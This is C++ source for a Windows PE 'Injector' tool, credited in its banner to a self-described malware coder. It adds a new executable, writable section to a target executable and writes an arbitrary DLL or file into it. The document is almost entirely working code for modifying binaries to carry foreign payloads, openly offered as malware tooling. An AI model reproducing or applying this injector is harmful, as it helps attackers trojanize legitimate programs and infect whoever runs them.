/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#include <Windows.h>
#include <iostream>

DWORD AlignSectionHeader(DWORD section_size, DWORD alignment, DWORD address)
{
	if (!(section_size % alignment))
		return address + section_size;
	return address + (section_size / alignment + 1) * alignment;
}

INT main(INT arg, PCHAR argv[])
{
	//Injector.exe "section name" "target" "file"

	if (argv[0] && argv[1] && argv[2] && argv[3])
	{
		char* target_process = argv[2];
		char* dll_path = argv[3];
		PCHAR section_name = argv[1];

		HANDLE x_file = CreateFileA(target_process, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		if (x_file != INVALID_HANDLE_VALUE)
		{
			DWORD file_size = GetFileSize(x_file, NULL);
			PBYTE file_buffer = PBYTE(LocalAlloc(LPTR, file_size));
			DWORD returned_bytes;

			BOOL file_read = ReadFile(x_file, file_buffer, file_size, &returned_bytes, NULL);
			if (file_read == TRUE && returned_bytes == file_size)
			{
				PIMAGE_DOS_HEADER image_dos_header = (PIMAGE_DOS_HEADER)file_buffer;
				if (image_dos_header->e_magic == IMAGE_DOS_SIGNATURE)
				{
					// if PE valid
					PIMAGE_FILE_HEADER image_file_header = (PIMAGE_FILE_HEADER)(file_buffer + image_dos_header->e_lfanew + sizeof(DWORD));
					PIMAGE_OPTIONAL_HEADER image_optional_header = (PIMAGE_OPTIONAL_HEADER)(file_buffer + image_dos_header->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
					PIMAGE_SECTION_HEADER image_section_header = (PIMAGE_SECTION_HEADER)(file_buffer + image_dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS));
					WORD PESections = image_file_header->NumberOfSections;

					ZeroMemory(&image_section_header[PESections], sizeof(IMAGE_SECTION_HEADER));
					CopyMemory(&image_section_header[PESections].Name, section_name, 8);

					HANDLE code_file = CreateFileA(dll_path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (code_file != INVALID_HANDLE_VALUE)
					{
						DWORD dll_size = GetFileSize(code_file, 0);
						if (dll_size > 0)
						{
							PBYTE dll_buffer = PBYTE(LocalAlloc(LPTR, dll_size));
							if (dll_buffer != ERROR)
							{
								DWORD returned_dll_bytes, unused_bytes;
								BOOL dll_read = ReadFile(code_file, dll_buffer, dll_size, &returned_dll_bytes, NULL);
								if (dll_read == TRUE && returned_dll_bytes == dll_size)
								{
									if (SetFilePointer(x_file, image_section_header[PESections].PointerToRawData + image_section_header[PESections].SizeOfRawData, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
									{
										image_section_header[PESections].Misc.VirtualSize = AlignSectionHeader(dll_size, image_optional_header->SectionAlignment, 0);
										image_section_header[PESections].VirtualAddress = AlignSectionHeader(image_section_header[PESections - 1].Misc.VirtualSize, image_optional_header->SectionAlignment, image_section_header[PESections - 1].VirtualAddress);

										image_section_header[PESections].SizeOfRawData = AlignSectionHeader(dll_size, image_optional_header->FileAlignment, 0);
										image_section_header[PESections].PointerToRawData = AlignSectionHeader(image_section_header[PESections - 1].SizeOfRawData, image_optional_header->FileAlignment, image_section_header[PESections - 1].PointerToRawData);
										image_section_header[PESections].Characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;

										if (SetFilePointer(x_file, image_section_header[PESections].PointerToRawData + image_section_header[PESections].SizeOfRawData, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
										{
											SetEndOfFile(x_file);
										}

										image_optional_header->SizeOfImage = image_section_header[PESections].VirtualAddress + image_section_header[PESections].Misc.VirtualSize;
										image_file_header->NumberOfSections += 1;

										if (SetFilePointer(x_file, 0, NULL, FILE_BEGIN) != INVALID_SET_FILE_POINTER)
										{
											// add section
											WriteFile(x_file, file_buffer, file_size, &returned_bytes, NULL);
										}

										// add file
										WriteFile(x_file, dll_buffer, dll_size, &unused_bytes, NULL);
									}
								}
								LocalFree(dll_buffer);
							}
						}
					}
					CloseHandle(code_file);
				}
			}
			LocalFree(file_buffer);
		}
		CloseHandle(x_file);
	}
	else
		std::cout << "Injector.exe 'section name' 'target' 'dll'";
}